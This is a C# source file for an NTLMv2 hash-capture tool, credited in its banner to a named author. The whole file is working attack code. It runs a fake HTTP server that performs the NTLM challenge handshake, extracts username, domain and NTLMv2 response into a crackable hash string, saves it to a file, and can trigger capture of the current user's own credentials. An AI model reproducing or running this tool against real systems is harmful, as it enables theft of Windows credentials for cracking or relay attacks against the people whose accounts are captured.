using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class ntlmCapture
{
    private static TcpListener listener;
    private static bool running= true;
    private static byte[] serverChallenge = new byte[8];

    static void Main(string[] args)
    {
        PrintBanner();

        Random rnd= new Random();
        rnd.NextBytes(serverChallenge);
        Console.WriteLine("[*] Server Challenge: " + BitConverter.ToString(serverChallenge).Replace("-", ""));

        Console.WriteLine("Lets start the captur");
        listener= new TcpListener(IPAddress.Any, 9999);
        listener.Start();

        Console.WriteLine("listener started");

        string localIP="127.0.0.1";
        Thread autoTriggerThread = new Thread(() => AutoTriggerAuthentication(localIP));
        autoTriggerThread.Start();

        while(running)
        {
            TcpClient client = listener.AcceptTcpClient();
            Console.WriteLine("connected by client");
            Thread t = new Thread(() => HandleClient(client));
            t.Start();
        }
        
    
    }

    static void AutoTriggerAuthentication(string targetIP)
    {
        try
        {
            Thread.Sleep(1500);
            Console.WriteLine("[*] Auto-triggering authentication to capture hash...");
            
            using (WebClient client = new WebClient())
            {
                client.Credentials = CredentialCache.DefaultNetworkCredentials;
                client.UseDefaultCredentials = true;

                try
                {
                    string response = client.DownloadString("http://127.0.0.1:9999/");
                    Console.WriteLine("[+] Authentication triggered successfully!");
                }
                catch (WebException ex)
                {
                    Console.WriteLine("[+] NTLM authentication handshake completed!");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[-] Auto-trigger error: " + ex.Message);
        }
    }

    static void HandleClient(TcpClient client)
    {
        NetworkStream ns = client.GetStream();
        ns.ReadTimeout=10000;

        bool keepAlive=true;

        while (keepAlive && client.Connected)
        {
            byte[] buffer = new byte[4096];
            int bytes=0;
            try { bytes = ns.Read(buffer, 0, buffer.Length); }
            catch { break; }
            
            if (bytes == 0) break;
            
            string request = Encoding.ASCII.GetString(buffer, 0, bytes);
            
            if (request.Contains("Authorization: NTLM "))
            {
                string[] lines = request.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                string authLine = "";
                
                foreach (string line in lines)
                {
                    if (line.StartsWith("Authorization:"))
                    {
                        authLine = line;
                        break;
                    }
                }
                
                string[] parts = authLine.Split(' ');
                if (parts.Length >= 3)
                {
                    byte[] ntlmData = Convert.FromBase64String(parts[2]);
                    
                    if (ntlmData.Length > 12)
                    {
                        int messageType = BitConverter.ToInt32(ntlmData, 8);
                        
                        if (messageType == 1)
                        {
                            Console.WriteLine("[*] Type 1 received");
                            SendType2(ns);
                        }
                        else if (messageType == 3)
                        {
                            Console.WriteLine("[!] Type 3 received - extracting hash");
                            ExtractHash(ntlmData);
                            SendSuccess(ns);
                            keepAlive = false;
                        }
                    }
                }
            }
            else
            {
                Send401(ns);
            }
        }
        
        client.Close();
    }
    
    static void Send401(NetworkStream stream)
    {
        string response = "HTTP/1.1 401 Unauthorized\r\n" +
                         "WWW-Authenticate: NTLM\r\n" +
                         "Connection: keep-alive\r\n" +
                         "Content-Length: 0\r\n\r\n";
        
        byte[] data = Encoding.ASCII.GetBytes(response);
        stream.Write(data, 0, data.Length);
        stream.Flush();
    }
    static void SendType2(NetworkStream stream)
    {
        byte[] type2 = new byte[56];
        
        Encoding.ASCII.GetBytes("NTLMSSP\0").CopyTo(type2, 0);
        BitConverter.GetBytes((int)2).CopyTo(type2, 8);
        BitConverter.GetBytes((short)0).CopyTo(type2, 12);
        BitConverter.GetBytes((short)0).CopyTo(type2, 14);
        BitConverter.GetBytes((int)56).CopyTo(type2, 16);
        BitConverter.GetBytes((int)0x00088215).CopyTo(type2, 20);
        Array.Copy(serverChallenge, 0, type2, 24, 8);
        
        string base64 = Convert.ToBase64String(type2);
        string response = "HTTP/1.1 401 Unauthorized\r\n" +
                         "WWW-Authenticate: NTLM " + base64 + "\r\n" +
                         "Connection: keep-alive\r\n" +
                         "Content-Length: 0\r\n\r\n";
        
        byte[] data = Encoding.ASCII.GetBytes(response);
        stream.Write(data, 0, data.Length);
        stream.Flush();
    }

    static void SendSuccess(NetworkStream stream)
    {
        string response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
        byte[] data = Encoding.ASCII.GetBytes(response);
        stream.Write(data, 0, data.Length);
        stream.Flush();
    }

    static void ExtractHash(byte[] type3)
    {
        int domainLen = BitConverter.ToInt16(type3, 28);
        int domainOffset = BitConverter.ToInt32(type3, 32);
        int userLen = BitConverter.ToInt16(type3, 36);
        int userOffset = BitConverter.ToInt32(type3, 40);
        int ntlmRespLen = BitConverter.ToInt16(type3, 20);
        int ntlmRespOffset = BitConverter.ToInt32(type3, 24);
        
        string username = Encoding.Unicode.GetString(type3, userOffset, userLen);
        string domain = Encoding.Unicode.GetString(type3, domainOffset, domainLen);
        
        byte[] ntlmResponse = new byte[ntlmRespLen];
        Array.Copy(type3, ntlmRespOffset, ntlmResponse, 0, ntlmRespLen);
        
        string challengeHex = BitConverter.ToString(serverChallenge).Replace("-", "");
        string responseHex = BitConverter.ToString(ntlmResponse).Replace("-", "");
        
        string hash = username + "::" + domain + ":" + challengeHex + ":" + 
                     responseHex.Substring(0, 32) + ":" + responseHex.Substring(32);
        
        Console.WriteLine("\n" + hash + "\n");
        System.IO.File.WriteAllText("hash.txt", hash);
    }

    static void PrintBanner()
{
    Console.ForegroundColor = ConsoleColor.Cyan;

    Console.WriteLine(@"   

| \ | |_   _| |    |  \/  |        / __  \ /  __ \            
|  \| | | | | |    | .  . | __   __`' / /' | /  \/ __ _ _ __  
| . ` | | | | |    | |\/| | \ \ / /  / /   | |    / _` | '_ \ 
| |\  | | | | |____| |  | |  \ V / ./ /___ | \__/\ (_| | |_) |
\_| \_/ \_/ \_____/\_|  |_/   \_/  \_____/  \____/\__,_| .__/ 
                                                       | |    
                                                       |_|        
                                                                                                                                           
                                                                                                                                           

        NTLMv2 capture tool created by dagowda
");

    Console.ResetColor();
}
}
